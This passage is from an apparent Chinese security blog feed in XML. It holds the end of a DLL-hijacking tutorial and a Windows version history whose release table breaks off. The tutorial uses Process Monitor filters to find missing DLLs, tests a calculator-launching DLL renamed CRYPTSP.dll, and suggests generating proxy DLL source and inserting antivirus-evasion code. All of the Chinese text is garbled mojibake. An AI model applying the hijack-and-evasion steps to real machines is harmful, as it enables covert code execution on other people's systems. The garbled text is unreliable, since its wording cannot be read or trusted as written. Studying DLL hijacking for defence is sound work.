title="æ‰‹åŠ¨å¯»æ‰¾"></a>æ‰‹åŠ¨å¯»æ‰¾</h2><p>ç”±äºWindows 10åšäº†å¾ˆå¤šé™åˆ¶ï¼Œæˆ‘ä»¬ä½¿ç”¨Windows 7æ¥æµ‹è¯•ä¼šæ–¹ä¾¿å¾ˆå¤šï¼Œå¦‚æœæ˜¯æ–°çš„Windows 7ç³»ç»Ÿéœ€è¦æ‰“ä¸ªè¡¥ä¸ï¼Œä¸ç„¶ç”¨ä¸äº†Process Monitor</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.microsoft.com&#x2F;en-us&#x2F;download&#x2F;confirmation.aspx?id&#x3D;46148</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨<code>NDP461-KB3102438-Web.exe</code>ç¨‹åºè¿›è¡Œè¿›è¡Œæµ‹è¯•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#å¾®è½¯ä¸‹è½½åœ°å€</span><br><span class="line">http:&#x2F;&#x2F;www.microsoft.com&#x2F;zh-cn&#x2F;download&#x2F;details.aspx?id&#x3D;49981&amp;134b2bb0-86c1-fe9f-d523-281faef41695&#x3D;1&amp;fa43d42b-25b5-4a42-fe9b-1634f450f5ee&#x3D;True</span><br><span class="line">#å¤‡ç”¨ä¸‹è½½åœ°å€</span><br><span class="line">XXX</span><br></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨Process Monitoråšå¦‚ä¸‹è®¾ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Include the following filters:</span><br><span class="line">Operation is CreateFile</span><br><span class="line">Operation is LoadImage</span><br><span class="line">Path contains .cpl</span><br><span class="line">Path contains .dll</span><br><span class="line">Path contains .drv</span><br><span class="line">Path contains .exe</span><br><span class="line">Path contains .ocx</span><br><span class="line">Path contains .scr</span><br><span class="line">Path contains .sys</span><br><span class="line"></span><br><span class="line">Exclude the following filters:</span><br><span class="line">Process Name is procmon.exe</span><br><span class="line">Process Name is Procmon64.exe</span><br><span class="line">Process Name is System</span><br><span class="line">Process Name is not NDP461-KB3102438-Web.exe &#x2F;&#x2F;è¿™ä¸ªæ˜¯ä½ è¦æµ‹è¯•çš„è¿›ç¨‹</span><br><span class="line">Operation begins with IRP_MJ_</span><br><span class="line">Operation begins with FASTIO_</span><br><span class="line">Result is SUCCESS</span><br><span class="line">Path ends with pagefile.sys</span><br></pre></td></tr></table></figure><p><strong>è®¾ç½®Exclude Result is SUCCESSåä¼šåªæ˜¾ç¤ºNAME NOT FOUNDé¡¹ï¼Œä¹Ÿå°±æ˜¯åªæŸ¥çœ‹æœªæˆåŠŸåŠ è½½çš„dllé¡¹ï¼Œå³KnownDLLsçš„åˆ—è¡¨ä¸­ä¸åŒ…å«çš„dllåç§°ï¼Œå¯ç”¨äºæŸ¥æ‰¾å­˜åœ¨æ¼æ´çš„dllè·¯å¾„</strong></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DynamicLinkLibraryHijack/2.png" alt="image-20201113145850843"></p><p>å¯ä»¥çœ‹åˆ°<code>NDP461-KB3102438-Web.exe</code>åœ¨å¯åŠ¨çš„è¿‡ç¨‹ä¸­ä¼šåŠ è½½ä¸‹å›¾ä¸­æ¡†èµ·æ¥çš„DLLï¼Œå¹¶ä¸”DLLçš„è·¯å¾„å’Œè¿™ä¸ªè¿›ç¨‹åœ¨ç›¸åŒæ–‡ä»¶å¤¹ï¼ŒåŒæ—¶æ˜¾ç¤º<code>NAME NOT FOUND</code>ï¼Œè¡¨ç¤ºæ— æ³•æ‰¾åˆ°è¯¥æ–‡ä»¶ï¼ŒåŠ è½½å¤±è´¥ï¼Œè¿™å°±è¯´æ˜è¿™å‡ ä¸ªDLLæ˜¯å¯ä»¥è¿›è¡ŒåŠ«æŒçš„</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DynamicLinkLibraryHijack/3.png" alt="image-20201113150057290"></p><h2 id="åŠ«æŒæµ‹è¯•"><a href="#åŠ«æŒæµ‹è¯•" class="headerlink" title="åŠ«æŒæµ‹è¯•"></a>åŠ«æŒæµ‹è¯•</h2><p>æ—¢ç„¶å‘ç°äº†åŠ«æŒçš„DLLï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›ç¨‹åˆæ­¥æ¼”ç¤ºäº†ï¼Œæä¸€ä¸ªæ‰§è¡Œè®¡ç®—å™¨çš„DLLç„¶åæŠŠå®ƒæ”¹åä¸ºCRYPTSP.dllï¼Œæ¥ç€è¿è¡Œç¨‹åºå³å¯è¾¾åˆ°åŠ«æŒçš„ä½œç”¨</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DynamicLinkLibraryHijack/4.png" alt="image-20201113151256951"></p><h2 id="å®æˆ˜åŒ–åˆ©ç”¨"><a href="#å®æˆ˜åŒ–åˆ©ç”¨" class="headerlink" title="å®æˆ˜åŒ–åˆ©ç”¨"></a>å®æˆ˜åŒ–åˆ©ç”¨</h2><p>å¦‚æœåŠ¨æ‰‹è¿‡çš„å°ä¼™ä¼´å¯ä»¥å‘ç°ï¼Œå¦‚æœæˆ‘ä»¬å§CRYPTSP.dllçš„åç§°æ”¹æˆVERSION.dllçš„æ—¶å€™ç”¨æ¥åŠ«æŒçš„è¯ï¼Œä¼šå‘ç°æŠ¥é”™ã€‚</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DynamicLinkLibraryHijack/5.png" alt="image-20201113151835798"></p><p>ä¸»è¦çš„åŸå› æ˜¯æµ‹è¯•DLLåªæœ‰ä¸€ä¸ªåŠ è½½çš„æ—¶å€™æ‰§è¡Œè®¡ç®—å™¨çš„å‡½æ•°ï¼Œè€Œå¹¶æ²¡æœ‰åŠ«æŒç›®æ ‡ä¸Šé¢çš„æ‰€æœ‰å¯¼å‡ºå‡½æ•°ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªå¯ä»¥åŠ«æŒçš„DLLçš„æ—¶å€™ï¼Œéœ€è¦ç”¨è„šæœ¬ä¸€é”®ç”ŸæˆåŠ«æŒcppæ–‡ä»¶åè¿›è¡Œç¼–è¯‘ï¼Œä»¥ä¸‹æ˜¯å¯¹ç³»ç»Ÿä¸­çš„twain_32çš„ä¸€é”®ç”Ÿæˆæ–¹å¼çš„æ¼”ç¤º</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DynamicLinkLibraryHijack/6.png" alt="image-20201113152556376"></p><p>å¯¼å‡ºåæˆ‘ä»¬å°±å¯ä»¥æŠŠå…æ€ä»£ç æ”¾åˆ°è¿™ä¸ªä½ç½®ç„¶åç¼–è¯‘å³å¯</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DynamicLinkLibraryHijack/7.png" alt="image-20201113152811232"></p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sensepost&#x2F;rattler</span><br><span class="line">https:&#x2F;&#x2F;3gstudent.github.io&#x2F;DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Windowsæ‚è°ˆ</title>
    <link href="https://www.ascotbe.com/2020/11/02/WindowsTalk/"/>
    <id>https://www.ascotbe.com/2020/11/02/WindowsTalk/</id>
    <published>2020-11-02T10:45:42.000Z</published>
    <updated>2021-05-17T00:32:35.016Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å‰è¨€</p></blockquote><p>æ¢³ç†Windowsçš„å†å²</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HardwareRelated/1.png" alt="1" style="zoom:50%;" /><h3 id="Windowsæ‚è°ˆ"><a href="#Windowsæ‚è°ˆ" class="headerlink" title="Windowsæ‚è°ˆ"></a>Windowsæ‚è°ˆ</h3><p>å¾®è½¯äº1985å¹´11æœˆ20æ—¥æ¨å‡ºäº†åä¸ºWindowsçš„æ“ä½œç³»ç»Ÿï¼Œä½œä¸ºMS-DOSçš„å›¾å½¢æ“ä½œç³»ç»Ÿå¤–å£³ï¼Œè€ŒMacOSæ˜¯1984å¹´æ¨å‡ºçš„ã€‚å¹¶ä¸”Windows 10æ˜¯å¾®è½¯æœ€åä¸€ä¸ªç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿï¼Œä¸åœ¨ä¼šæœ‰åƒWindows 7 å’ŒWindows 7 sp1 æˆ–è€…sp2è¿™ç§å‡çº§ï¼Œè€Œæ˜¯ç»Ÿä¸€ä½¿ç”¨Windows 10 1507è¿™æ ·çš„ç¼–å·ã€‚</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HardwareRelated/2.png" alt="image-20201102145353213"> </p><h3 id="Windowså†…æ ¸åŒºåˆ«"><a href="#Windowså†…æ ¸åŒºåˆ«" class="headerlink" title="Windowså†…æ ¸åŒºåˆ«"></a>Windowså†…æ ¸åŒºåˆ«</h3><blockquote><h4 id="MS-DOS"><a href="#MS-DOS" class="headerlink" title="MS-DOS"></a>MS-DOS</h4></blockquote><p>1980å¹´ï¼Œè¥¿é›…å›¾è®¡ç®—æœºäº§å“å…¬å¸çš„ä¸€å24å²çš„ç¨‹åºå‘˜Tim Paterson(è’‚å§†Â·å¸•ç‰¹æ£®)èŠ±è´¹äº†å››ä¸ªæœˆæ—¶é—´ç¼–å†™å‡ºäº† 86-DOS æ“ä½œç³»ç»Ÿã€‚1981å¹´7æœˆï¼Œå¾®è½¯ä»¥äº”ä¸‡ç¾å…ƒçš„ä»£ä»·å‘è¥¿é›…å›¾å…¬å¸è´­å¾—æœ¬äº§å“çš„å…¨éƒ¨è‘—ä½œæƒï¼Œå¹¶å°†å®ƒæ›´åä¸º MS-DOSã€‚</p><p>MS-DOSæºç ä¸‹è½½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;computerhistory.org&#x2F;blogs&#x2F;microsoft-research-license-agreement-msdos-v1-1-v2-0&#x2F;</span><br></pre></td></tr></table></figure><blockquote><h4 id="Windows-95"><a href="#Windows-95" class="headerlink" title="Windows 95"></a>Windows 95</h4></blockquote><p>Windows 95æ˜¯å¾®è½¯å…¬å¸äº1995å¹´æ¨å‡ºçš„ç”µè„‘æ“ä½œç³»ç»Ÿã€‚Windows 95æ˜¯ä¸€ä¸ªæ··åˆçš„16ä½/32ä½Windowsç³»ç»Ÿï¼Œå…¶ç‰ˆæœ¬å·ä¸º4.0ï¼Œå¼€å‘ä»£å·ä¸ºChicagoã€‚Windows 95æ˜¯å¾®è½¯ä¹‹å‰ç‹¬ç«‹çš„æ“ä½œç³»ç»ŸMS-DOSå’ŒMicrosoft Windowsçš„ç›´æ¥åç»­ç‰ˆæœ¬ã€‚</p><p>Windows 95å…±æœ‰äº”ç§ç‰ˆæœ¬ï¼š</p><ul><li>Windows 95 é›¶å”®ç‰ˆï¼ˆå‘å¸ƒæ—¥æœŸ1995å¹´8æœˆ24æ—¥ï¼‰</li><li>Windows 95 OEM Service Release 1ï¼ˆOSR1ï¼‰ï¼ˆå‘å¸ƒæ—¥æœŸ1996å¹´2æœˆ14æ—¥ï¼ŒåŒ…æ‹¬ Windows 95 Service Pack 1ï¼‰</li><li>Windows 95 OEM Service Release 2ï¼ˆOSR2ï¼‰ï¼ˆå‘å¸ƒæ—¥æœŸ1996å¹´8æœˆ24æ—¥ï¼ŒåŒ…æ‹¬ä¸€äº›æ”¹è‰¯ä¾‹å¦‚IE 3.0å’ŒFAT32çš„æ”¯æŒï¼‰</li><li>Windows 95 OEM Service Release 2.1ï¼ˆOSR2.1ï¼‰ï¼ˆå‘å¸ƒæ—¥æœŸ1997å¹´8æœˆ24æ—¥ï¼ŒåŒ…æ‹¬åŸºæœ¬USBæ”¯æŒï¼‰</li><li>Windows 95 OEM Service Release 2.5ï¼ˆOSR2.5ï¼‰ï¼ˆå‘å¸ƒæ—¥æœŸ1997å¹´11æœˆ26æ—¥ï¼ŒåŒ…æ‹¬ä»¥ä¸Šç‰ˆæœ¬å¤šæ‰€æœ‰åŠŸèƒ½ï¼Œå¦é™„IE 4.0ä¸DirectX 5.0ï¼‰</li></ul><blockquote><h4 id="Windows-Embedded-Compact"><a href="#Windows-Embedded-Compact" class="headerlink" title="Windows Embedded Compact"></a>Windows Embedded Compact</h4></blockquote><p>Windows CE 1.0æœ€æ—©äº1996å¹´æ¨å‡ºï¼Œæ˜¯å•è‰²çš„<strong>Windows 95</strong>å†…æ ¸ç®€åŒ–ç‰ˆæœ¬ã€‚</p><p>Windows CE 3.0æ˜¯å¾®è½¯çš„Windows Compact Editionï¼Œå·²æ‘†è„±æ—§æœ‰çš„Windows 95ç®€åŒ–æ ¼å¼ï¼Œæ˜¯ä¸€å¥—å…¨æ–°çš„æ“ä½œç³»ç»Ÿï¼Œæ”¯æŒ5ç§CPUï¼šx86ã€PowerPCã€ARMã€MIPSã€SH3/4ã€‚</p><p>ç›®å‰å·²ç»æ›´æ–°åˆ°Windows CE 7.0</p><p>Windows CEå¯ä»¥ä½¿ç”¨åœ¨å„å¼å„æ ·çš„ç³»ç»Ÿä¸Šï¼Œæœ€æœ‰åçš„æ˜¯Pocket PCä»¥åŠå¾®è½¯çš„SmartPhoneã€‚å…¶ä»–è¾ƒä¸ä¸ºäººçŸ¥çš„è®¾å¤‡åŒ…æ‹¬å¾®è½¯çš„è½¦è½½ç”µè„‘ã€æœºé¡¶ç›’ã€ç”Ÿäº§åœ¨çº¿çš„æ§åˆ¶è®¾å¤‡ã€å…¬å…±åœºæ‰€çš„ä¿¡æ¯ç«™ã€ç”µå­è¾å…¸åŠå¯¼èˆªä»ªç­‰ç­‰ï¼Œæœ‰äº›è®¾å¤‡ç”šè‡³æ²¡æœ‰ä»»ä½•äººæœºç•Œé¢ã€‚</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HardwareRelated/3.png" alt="Timeline of Windows CE Development"></p><p align="center" >æˆªæ­¢2007å¹´æ•°æ®ï¼ˆ2011å¹´å·²ä½¿ç”¨CE 7.0å†…æ ¸ï¼‰</p><blockquote><h4 id="Windows-New-Technology"><a href="#Windows-New-Technology" class="headerlink" title="Windows New Technology"></a>Windows New Technology</h4></blockquote><p><strong>Windows NT</strong>ï¼Œ<strong>æ–°æŠ€æœ¯è§†çª—æ“ä½œç³»ç»Ÿ</strong>ï¼ˆWindows New Technologyï¼‰çš„ç®€ç§°ï¼Œæ˜¯å¾®è½¯å…¬å¸1993å¹´æ¨å‡ºçš„çº¯32ä½æ“ä½œç³»ç»Ÿæ ¸å¿ƒã€‚æˆªæ­¢2020å¹´æœ€æ–°å†…æ ¸ç‰ˆæœ¬ä¸ºNT 10</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HardwareRelated/4.png" alt="img"></p><h3 id="Windowsç‰ˆæœ¬å†å²"><a href="#Windowsç‰ˆæœ¬å†å²" class="headerlink" title="Windowsç‰ˆæœ¬å†å²"></a>Windowsç‰ˆæœ¬å†å²</h3><blockquote><h4 id="ä»¥-DOS-ä¸ºåŸºç¡€çš„-Windows"><a href="#ä»¥-DOS-ä¸ºåŸºç¡€çš„-Windows" class="headerlink" title="ä»¥ DOS ä¸ºåŸºç¡€çš„ Windows"></a>ä»¥ DOS ä¸ºåŸºç¡€çš„ Windows</h4></blockquote><p>æ—©æœŸç‰ˆæœ¬çš„Windowsé€šå¸¸è¢«çœ‹ä½œä»…ä»…æ˜¯è¿è¡ŒäºMS-DOSç³»ç»Ÿä¸­çš„ä¸€ä¸ªå›¾å½¢ç”¨æˆ·ç•Œé¢ï¼Œä¸æ˜¯æ“ä½œç³»ç»Ÿã€‚16ä½ç‰ˆæœ¬çš„WindowsåŒ…æ‹¬<strong>Windows 1.0</strong>ã€<strong>Windows 2.0</strong>åŠæœ€å¾Œç‰ˆæœ¬<strong>Windows 3.X</strong>ã€‚</p><blockquote><h4 id="ä»¥-Windows-9x-ä¸ºåŸºç¡€çš„-Windows"><a href="#ä»¥-Windows-9x-ä¸ºåŸºç¡€çš„-Windows" class="headerlink" title="ä»¥ Windows 9x ä¸ºåŸºç¡€çš„ Windows"></a>ä»¥ Windows 9x ä¸ºåŸºç¡€çš„ Windows</h4></blockquote><p><strong>Windows 9x</strong>æ˜¯<strong>Windows 95</strong>ã€<strong>Windows 98</strong>ã€<strong>Windows ME</strong>ç­‰ä»¥ <strong>Windows 95</strong>å†…æ ¸ä½œä¸ºå‚è€ƒçš„å¾®è½¯æ“ä½œç³»ç»Ÿé€šç§°ï¼Œä¸ <strong>Windows NT</strong>åˆ†ç¦»äºä¸¤ä¸ªå¼€å‘è·¯çº¿ã€‚å®ƒæ˜¯ä¸€ç§å¤šä»»åŠ¡å›¾å½¢æ–¹å¼çš„æ“ä½œç³»ç»Ÿã€‚</p><p>Windows 9x ä»ç„¶éœ€è¦ä¾èµ–16ä½çš„DOSåŸºå±‚ç¨‹å¼æ‰èƒ½è¿è¡Œï¼Œä¸ç®—æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„32ä½æ“ä½œç³»ç»Ÿï¼Œç”±äºä½¿ç”¨DOSä»£ç ï¼Œæ¶æ„ä¹Ÿä¸16ä½DOSä¸€æ ·ï¼Œæ ¸å¿ƒå±äºå•æ ¸å¿ƒï¼Œä½†ä¹Ÿå¼•å…¥äº†éƒ¨åˆ†32ä½ä½œæ¥­ç³»çµ±çš„ç‰¹æ€§ï¼Œå…·æœ‰ä¸€å®šçš„32ä½çš„å¤„ç†èƒ½åŠ›ã€‚</p><blockquote><h4 id="ä»¥-Windows-NT-å†…æ ¸ä¸ºåŸºç¡€çš„-Windows"><a href="#ä»¥-Windows-NT-å†…æ ¸ä¸ºåŸºç¡€çš„-Windows" class="headerlink" title="ä»¥ Windows NT å†…æ ¸ä¸ºåŸºç¡€çš„ Windows"></a>ä»¥ Windows NT å†…æ ¸ä¸ºåŸºç¡€çš„ Windows</h4></blockquote><h5 id="32ä½å…ƒæ“ä½œç³»ç»Ÿ"><a href="#32ä½å…ƒæ“ä½œç³»ç»Ÿ" class="headerlink" title="32ä½å…ƒæ“ä½œç³»ç»Ÿ"></a>32ä½å…ƒæ“ä½œç³»ç»Ÿ</h5><p>é€™å€‹ç³»åˆ—æ˜¯<strong>Windows NTä½“ç³»ç»“æ„</strong>æ“ä½œç³»ç»Ÿï¼Œæ˜¯çœŸæ­£çš„çº¯32ä½æ“ä½œç³»ç»Ÿã€‚Windows NTæ¶æ„æ“ä½œç³»ç»Ÿæ˜¯å®Œæ•´ç¨ç«‹çš„æ“ä½œç³»ç»Ÿï¼Œä¸åŒæ–¼ä¾ç„¶éœ€è¦DOSåŸºå±¤ç¨‹å¼çš„æ··åˆ16/32ä½çš„Windows 9xã€‚</p><h5 id="64ä½æ“ä½œç³»ç»Ÿ"><a href="#64ä½æ“ä½œç³»ç»Ÿ" class="headerlink" title="64ä½æ“ä½œç³»ç»Ÿ"></a>64ä½æ“ä½œç³»ç»Ÿ</h5><p>64ä½Windows NTæ¶æ„æ“ä½œç³»ç»Ÿï¼Œåˆ†ä¸ºæ”¯æŒäº<strong>IA-64</strong>æ¶æ„å’Œ<strong>x64</strong>æ¶æ„çš„ä¸¤ç§ä¸åŒç‰ˆæœ¬ã€‚</p><p>åœ¨å†å²ä¸Šå¾®è½¯æ›¾å¯¹ä¸¤ç§ä¸åŒçš„64ä½æ¶æ„æä¾›æ”¯æŒï¼Œå…¶ä¸€æ˜¯Intelå…¬å¸å’ŒHPè”åˆå¼€å‘å…·æœ‰é©æ–°åŒ–çš„Itaniumå®¶æ—æ¶æ„ï¼Œæˆ–ç§°ä¹‹ä¸ºIA-64ï¼›å’ŒAMDå…¬å¸å¼€å‘çš„æ¼”è¿›åŒ–çš„x86-64æ¶æ„ã€‚å¾®è½¯åœ¨å‘å¸ƒWindows Server 2012 R2å‰æ”¾å¼ƒäº†å¯¹Itaniumæ¶æ„çš„æ”¯æŒã€‚å› æ­¤ç°åœ¨å¾®è½¯çš„64ä½äº§å“æŒ‡çš„å•å•æ˜¯x86-64æ¶æ„ï¼Œè€Œåœ¨å¾®è½¯çš„è¯æ±‡ä¸­ç§°ä¸ºx64ã€‚</p><p>æ”¯æŒItaniumå®¶æ—æ¶æ„çš„å¾®è½¯Windowsäº§å“æœ‰ï¼š</p><ul><li>Windows 2000 Advanced/Datacenter Server Limited Edition</li><li>Windows XP 64-bit Edition</li><li>Windows XP 64-bit Edition Version 2003</li><li>Windows Server 2003/2003 R2 Enterprise/Datacenter</li><li>Windows Server 2008/2008 R2 for Itanium Based System</li></ul><p>æ”¯æŒx64æ¶æ„çš„Windowsäº§å“æœ‰ï¼š</p><ul><li>Windows XP Professional x64 Edition</li><li>Windows Server 2003/2003R2å…¨çº¿äº§å“ï¼ˆWebç‰ˆé™¤å¤–ï¼‰</li><li>Windows Vista/7/8/8.1</li><li>Windows Server 2008/2008R2/2012/2012R2 å…¨çº¿äº§å“</li><li>Windows 10</li></ul><blockquote><h4 id="ä»¥-Windows-CE-å†…æ ¸ä¸ºåŸºç¡€çš„-Windows"><a href="#ä»¥-Windows-CE-å†…æ ¸ä¸ºåŸºç¡€çš„-Windows" class="headerlink" title="ä»¥ Windows CE å†…æ ¸ä¸ºåŸºç¡€çš„ Windows"></a>ä»¥ Windows CE å†…æ ¸ä¸ºåŸºç¡€çš„ Windows</h4></blockquote><p>è¿™ä¸ªæ“ä½œç³»ç»Ÿä¸»è¦æ˜¯ç”¨åœ¨åµŒå…¥å¼ç³»ç»Ÿä¸­æˆ–æ˜¯ç¡¬ä½“è§„æ ¼è¾ƒä½çš„ç”µè„‘ç³»ç»Ÿï¼ˆä¾‹å¦‚å¾ˆå°‘çš„è®°å¿†ä½“ï¼Œè¾ƒæ…¢çš„ä¸­å¤®å¤„ç†å™¨ç­‰ï¼‰</p><ul><li>Pocket PC 2000</li><li>Pocket PC 2002</li><li>Windows Mobile 2003</li><li>Windows Mobile 2003 SE</li><li>Windows Mobile 5</li><li>Windows Mobile 6</li><li>Windows Mobile 6.1</li><li>Windows Mobile 6.5</li><li>Windows Mobile 6.5.3</li><li>Windows Phone 7</li></ul><h4 align="center" >Windowsç‰ˆæœ¬å†å²</h4><table><thead><tr><th align="center">å‘å¸ƒæ—¶é—´</th><th align="center">ç‰ˆæœ¬ä»£å·</th><th align="center">æ­£å¼åç§°</th><th align="center">æœ€ç»ˆç»„å»º</th></tr></thead><tbody><tr><td align="center">1985å¹´11æœˆ20æ—¥</td><td align="center">1.01</td><td align="center">Windows 1.01 ï¼ˆå·²åœæ­¢æ”¯æŒäº2001/12/31ï¼‰</td><td align="center">-</td></tr><tr><td align="center">1986å¹´1æœˆ14æ—¥</td><td align="center">1.02</td><td align="center">Windows 1.02 ï¼ˆå·²åœæ­¢æ”¯æŒäº2001/12/30ï¼‰</td><td align="center">-</td></tr><tr><td align="center">1986å¹´8æœˆ14æ—¥</td><td align="center">1.03</td><td align="center">Windows 1.03 ï¼ˆå·²åœæ­¢æ”¯æŒäº2001/12/31ï¼‰</td><td align="center">-</td></tr><tr><td align="center">1987å¹´</td><td align="center">1.04</td><td align="center">Windows 1.04 ï¼ˆå·²åœæ­¢æ”¯æŒäº2001/12/31ï¼‰</td><td align="center">-</td></tr><tr><td align="center">1987å¹´12æœˆ9æ—¥</td><td align="center">2.03</td><td align="center">Windows 2.03 ï¼ˆå·²åœæ­¢æ”¯æŒäº2001/12/31ï¼‰</td><td align="center">-</td></tr><tr><td align="center">1988å¹´5æœˆ27æ—¥</td><td align="center">2.1</td><td align="center">Windows 2.1 ï¼ˆå·²åœæ­¢æ”¯æŒäº2001/12/31ï¼‰</td><td align="center">-</td></tr><tr><td align="center">1988å¹´5æœˆ27æ—¥</td><td align="center">2.1</td><td align="center">Windows/286 2.1 ( å·²åœæ­¢æ”¯æŒäº2001/12/31)</td><td align="center">-</td></tr><tr><td align="center">1988å¹´8æœˆ12æ—¥</td><td align="center">2.03</td><td align="center">Windows/386 2.03 ( å·²åœæ­¢æ”¯æŒäº2001/12/31)</td><td align="center">-</td></tr><tr><td align="center">1990å¹´5æœˆ22æ—¥</td><td align="center">3.0</td><td align="center">Windows 3.0 ( å·²åœæ­¢æ”¯æŒäº2001/12/31)</td><td align="center">-</td></tr><tr><td align="center">1992å¹´4æœˆ6æ—¥</td><td align="center">3.1</td><td align="center">Windows 3.1 ( å·²åœæ­¢æ”¯æŒäº2001/12/31)</td><td align="center">103</td></tr><tr><td align="center">1993å¹´7æœˆ27æ—¥</td><td align="center">NT 3.1</td><td align="center">Windows NT 3.1 ( å·²åœæ­¢æ”¯æŒäº2000-12-31 )</td><td align="center">511(RTM-SP2),528(SP3)</td></tr><tr><td align="center">1993å¹´8æœˆ11æ—¥</td><td align="center">WFW 3.11</td><td align="center">Windows For Workgroups 3.11 ( å·²åœæ­¢æ”¯æŒäº2001/12/31)</td><td align="center">300</td></tr><tr><td align="center">1993å¹´11æœˆ22æ—¥</td><td align="center">3.2</td><td align="center">Windows 3.2ï¼ˆç®€ä½“ä¸­æ–‡ç‰ˆï¼‰( å·²åœæ­¢æ”¯æŒäº2001/12/31 )</td><td align="center">153</td></tr><tr><td align="center">1994å¹´9æœˆ21æ—¥</td><td align="center">NT 3.5</td><td align="center">Windows NT 3.5 ( å·²åœæ­¢æ”¯æŒäº2001/12/31 )</td><td align="center">807</td></tr><tr><td align="center">1995å¹´5æœˆ30æ—¥</td><td align="center">NT 3.51</td><td align="center">Windows NT 3.51 ( å·²åœæ­¢æ”¯æŒ äº2001/12/31)</td><td align="center">1057</td></tr><tr><td align="center">1995å¹´8æœˆ24æ—¥</td><td align="center">4.0</td><td align="center">Windows 95 ( å·²åœæ­¢æ”¯æŒäº2001/12/31 )</td><td align="center">950(RTM,OSR1),1111(OSR2),1214(OSR2.1),1216(OSR2.5)</td></tr><tr><td align="center">1996å¹´7æœˆ29æ—¥</td><td align="center">NT 4.0</td><td align="center">Windows NT 4.0 ( å·²åœæ­¢æ”¯æŒäº2004/12/31)</td><td align="center">1381</td></tr><tr><td align="center">1996å¹´11æœˆ16æ—¥</td><td align="center">CE 1.01</td><td align="center">Windows CE 1.01 ( å·²åœæ­¢æ”¯æŒ )</td><td align="center">-</td></tr><tr><td align="center">1997å¹´11æœˆ1æ—¥</td><td align="center">CE 2.0</td><td align="center">Windows CE 2.0 ( å·²åœæ­¢æ”¯æŒ )</td><td align="center">-</td></tr><tr><td align="center">1998å¹´1æœˆ8æ—¥</td><td align="center">CE 2.01</td><td align="center">Windows CE 2.01 ( å·²åœæ­¢æ”¯æŒ )</td><td align="center">-</td></tr><tr><td align="center">1998å¹´3æœˆ1æ—¥</td><td align="center">CE 2.10</td><td align="center">Windows CE 2.10 ( å·²åœæ­¢æ”¯æŒ )</td><td align="center">-</td></tr><tr><td align="center">1998å¹´5æœˆ15æ—¥</td><td align="center">4.1</td><td align="center">Windows 98 ( å·²åœæ­¢æ”¯æŒäº2006/6/30)</td><td align="center">1998(RTM),2000(SP1)</td></tr><tr><td align="center">1998å¹´7æœˆ1æ—¥</td><td align="center">CE 2.11</td><td align="center">Windows CE 2.11 ( å·²åœæ­¢æ”¯æŒ )</td><td align="center">-</td></tr><tr><td align="center">1999å¹´4æœˆ23æ—¥</td><td align="center">4.1</td><td align="center">Windows 98 Second Editionï¼ˆ98 SEï¼‰( å·²åœæ­¢æ”¯æŒäº2006/6/30 )</td><td align="center">2222</td></tr><tr><td align="center">1999å¹´9æœˆ28æ—¥</td><td align="center">CE 2.12</td><td align="center">Windows CE 2.12 ( å·²åœæ­¢æ”¯æŒ )</td><td align="center">-</td></tr><tr><td align="center">2000å¹´</td><td align="center">NT 5.0</td><td align="center">Windows 2000 ( å·²åœæ­¢æ”¯æŒäº2010/7/13 )</td><td align="center">2195</td></tr><tr><td align="center">2000å¹´</td><td align="center">4.9</td><td align="center">Windows Millennium Edition ï¼ˆMEï¼‰( å·²åœæ­¢æ”¯æŒäº2006/6/30)</td><td align="center">3000</td></tr><tr><td align="center">2000å¹´</td><td align="center">CE 3.0</td><td align="center">Windows CE 3.0 ( å·²åœæ­¢æ”¯æŒ )</td><td align="center">-</td></tr><tr><td align="center">2001å¹´</td><td align="center">NT 5.1</td><td align="center">Windows XP ( å·²åœæ­¢æ”¯æŒäº2014/4/8 )</td><td align="center">2600</td></tr><tr><td align="center">2002å¹´</td><td align="center">CE 4.1</td><td align="center">Windows CE 4.1 ï¼ˆå·²åœæ­¢æ”¯æŒï¼‰</td><td 